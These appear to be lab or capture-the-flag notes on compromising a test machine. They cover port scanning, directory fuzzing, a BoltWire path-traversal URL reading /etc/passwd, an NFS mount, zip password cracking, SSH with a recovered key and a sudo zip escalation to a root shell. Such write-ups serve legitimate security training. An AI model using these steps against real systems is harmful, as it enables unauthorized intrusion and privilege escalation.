* Scanning using netdiscover and nmap:

```shell
sudo netdiscover -r 192.168.57.0/24
# 192.168.57.9

nmap -T4 -p- -A 192.168.57.9
```
- results
```shell
Nmap scan report for 192.168.57.9
Host is up (0.0011s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Bolt - Installation error
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33831/udp6  mountd
|   100005  1,2,3      44657/udp   mountd
|   100005  1,2,3      56309/tcp   mountd
|   100005  1,2,3      57901/tcp6  mountd
|   100021  1,3,4      33192/udp6  nlockmgr
|   100021  1,3,4      39257/tcp6  nlockmgr
|   100021  1,3,4      39563/tcp   nlockmgr
|   100021  1,3,4      47102/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
8080/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
33499/tcp open  mountd   1-3 (RPC #100005)
39563/tcp open  nlockmgr 1-4 (RPC #100021)
56309/tcp open  mountd   1-3 (RPC #100005)
58705/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.78 seconds

```
- ssh
- skip
- http
- definitely check
- rpcbind
- advanced
- nfs

* HTTP 80/8080
* Visiting the links http://192.168.57.9:80 and http://192.168.57.9:8080
  * Bolt CMS -  current folder is /var/www/html/
  * PHPinfo - /var/run/apache2
	  * PHP Version 7.3.27-1~deb10u1
	  * Linux dev 4.19.0-16-amd64 - Debian 4.19.181-1
* dir scanning
```shell
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.9:80/FUZZ
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://192.168.57.9:8080/FUZZ
```

* 80
* /public
* /src
* /app
	* /config/config.yml
	* **user=bolt, pass=I_love_java**
* /vendor
* /extensions>
* 8080
* /dev 
	* boltwire site
* /server-status

```bash
searchsploit boltwire                                                                                                                             
 -------------------------------------------------------------------------------------------------------------------------------------------------
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                               | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                                                                                                                                                      | php/webapps/48411.txt
--------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results

```
- LFI exploit in v6
	-  https://www.exploit-db.com/exploits/48411
	- create account and go to `http://192.168.51.169/boltwire/index.php?p=action.search&action=../../../../../../../etc/passwd`
	- gets user **jeanpaul**

* nfs_acl
```shell
showmount -e 192.168.57.9 #shows export list - 
# /srv/nfs

mkdir /mnt/dev/ 
mount -t nfs 192.168.57.9:/srv/nfs /mnt/dev/

cd /mnt/dev/
unzip save.zip # needs pass

apt install fcrackzip # crack zip passwords
fcrackzip -v -u -D -p /root/rockyou/rockyou.txt save.zip
# java101
# 2 files
```

  * todo.txt some text from jp
  * id_rsa, ssh key needs username => jeanpaul?.
```bash
ssh -i id_rsa jeanpaul@192.168.57.9
#pass I_love_java

history # look at command history

sudo -l # list commands for regular user w/o pass
# zip=> check gtfobins
```
- https://gtfobins.github.io/

```bash
TF=$(mktemp -u)

sudo zip $TF /etc/hosts -T -TT 'sh #'
# rootshell

id
cd /root
ls
cat flag.txt
```